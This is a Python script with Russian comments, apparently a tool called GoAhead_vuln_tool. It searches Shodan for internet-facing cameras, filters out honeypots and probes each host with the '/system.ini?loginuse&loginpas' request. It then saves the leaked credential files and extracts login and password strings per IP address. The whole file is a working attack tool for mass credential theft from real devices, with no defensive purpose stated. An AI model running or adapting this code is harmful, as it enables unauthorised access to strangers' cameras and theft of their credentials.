### Импорт библиотек

import requests
import json
import subprocess
import os
from time import sleep
import requests.exceptions
import socket

### Базовые переменные
FILES_FOLDER = "GoAhead_vuln_tool/files"
API_RESULTS_FILE = f"{FILES_FOLDER}/api_results.json"
PINGED_IP_ADRESSES_FILE = f"{FILES_FOLDER}/pinged_ips.json"
VULNERABLE_IP_ADRESSES_FILE = f"{FILES_FOLDER}/vuln_ips.json"

### Получаем данные с API

def get_api_results(API_KEY, search_request, page):

    with open(API_RESULTS_FILE, "w") as file:

        response = requests.get(f"https://api.shodan.io/shodan/host/search?key={API_KEY}&query={search_request}&page={page}")
        if response.status_code == 401:
            print("Неверный API ключ")
            exit()

        file.write(response.text)

### Пингуем адреса чтобы отбросить фейки с хонипотами и записываем REAAL адреса в файл

def ping_ips_for_valid(Timeout):

    js = open(API_RESULTS_FILE, "r", encoding="utf-8")

    js_data = json.loads(js.read())

    js.close()

    total_cams = js_data["total"]
    print(f"Всего по API найдено {total_cams} камер")

    if total_cams == 0:
        print("Камер нет, скрипт выключается")
        sleep(3)
        exit()

    def honeypot_check(i):
        try:
            tmp = js_data["matches"][i]["tags"]
        except KeyError:
    
            return False
        
        else:

            for o in js_data["matches"][i]["tags"]:

                if o == 'honeypot':
                    return True

    def ping(host,port): # Пинг по порту
        sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM) 
        sock.settimeout(Timeout)

        try:
            sock.connect((host,port))
        except:
            return False
        else:
            sock.close()
        return True
    
    file = open(PINGED_IP_ADRESSES_FILE, "w", encoding="utf-8")
    
    count_ips = 0

    for i, ips in enumerate(js_data["matches"]):
        host = js_data["matches"][i]["ip_str"]
        port = js_data["matches"][i]["port"]
        city = js_data["matches"][i]["location"]["city"]

        if honeypot_check(i):
                print(str(i) + ")HONEYPOT: " + host)
                continue
        
        if ping(host, port):
            count_ips += 1
            print(str(i) + ")OK: " + host)
            
            if count_ips == 1:
                ip_address_json = [{"ip": host, "port": port, "city": city}]

            ip_address_json += [{"ip": host, "port": port, "city": city}]

        else:
            print(str(i) + ")TIMEOUT/DENIED: " + host)
        
    ip_address_json_list = list(ip_address_json)
    json.dump(ip_address_json_list, file, separators=(',', ':'))

    file.close()

### Получаем IP адреса с имеющиеся уязвимостью и если нашли то записываем в файл

def find_vuln_cameras(Timeout):

    read_file = open(PINGED_IP_ADRESSES_FILE, "r", encoding="utf-8")
    pinged_ips_json = json.load(read_file)
    read_file.close()

    file = open(VULNERABLE_IP_ADRESSES_FILE, "w", encoding="utf-8")

    count_ips = 0

    for i, o in enumerate(pinged_ips_json):

        pinged_ip_host = f"{pinged_ips_json[i]['ip']}:{pinged_ips_json[i]['port']}"


        try:
            filedata = requests.get(f"http://{pinged_ip_host}/system.ini?loginuse&loginpas", timeout=Timeout)
        except (requests.exceptions.ConnectionError, requests.exceptions.ReadTimeout, requests.exceptions.Timeout) as e:
            continue

        try:
            content_type = filedata.headers["Content-type"]
        except KeyError:
            continue

        if content_type == "text/plain":
            count_ips += 1

            if count_ips == 1:
                vuln_ip_address_json = [pinged_ips_json[i]]

            vuln_ip_address_json += [pinged_ips_json[i]]

            print("PASS FILE FOUND: " + pinged_ip_host)
            if count_ips >= 4:
                break

    vuln_ip_address_json_list = list(vuln_ip_address_json)
    json.dump(vuln_ip_address_json_list, file, separators=(',', ':'))
    file.close()


def get_creditionals_from_vuln_ips(Timeout): # Получаем содержимое файла с паролями
        
    file = open(VULNERABLE_IP_ADRESSES_FILE, "r", encoding="utf-8")
    vulnerable_ips_json = json.load(file)

    for i, o in enumerate(vulnerable_ips_json):
        vuln_ip_host = f"{vulnerable_ips_json[i]['ip']}:{vulnerable_ips_json[i]['port']}"

        try: response = requests.get(f"http://{vuln_ip_host}/system.ini?loginuse&loginpas", timeout=Timeout)
        except (requests.Timeout, requests.exceptions.ConnectionError) as e:
            continue
        try: content_type = response.headers["Content-type"]
        except KeyError:
            continue      
        if content_type == "text/plain":
            writefile = open("GoAhead_vuln_tool/passfiles/pass.txt", "w", encoding="utf-8")

            with open(f"GoAhead_vuln_tool/passfiles/passfile({vulnerable_ips_json[i]['ip']}).txt", "w", encoding="utf-8") as passwr:
                writefile.write(response.text)
                writefile.close()

                if os.name == "nt":
                    output = subprocess.check_output("powershell ./GoAhead_vuln_tool/strings.exe -nobanner 'GoAhead_vuln_tool/passfiles/pass.txt'", shell=True) # Удаляет не utf-8 строки

                else:
                    output = subprocess.check_output("strings 'GoAhead_vuln_tool/passfiles/pass.txt'", shell=True) # Совместимость с Linux/MacOS

                passwr.write(f"Strings with login/passwords for {vuln_ip_host} \n" + output.decode("utf-8", errors="ignore"))

    try: os.remove("GoAhead_vuln_tool/passfiles/pass.txt")
    except FileNotFoundError:
        pass
    file.close()


def all_in_one(API_KEY, search_request, page, Timeout): # Оптимизированный вариант пункта "Все вместе"
    get_api_results(API_KEY, search_request, page)
    ping_ips_for_valid(Timeout)
    find_vuln_cameras(Timeout)
    get_creditionals_from_vuln_ips(Timeout)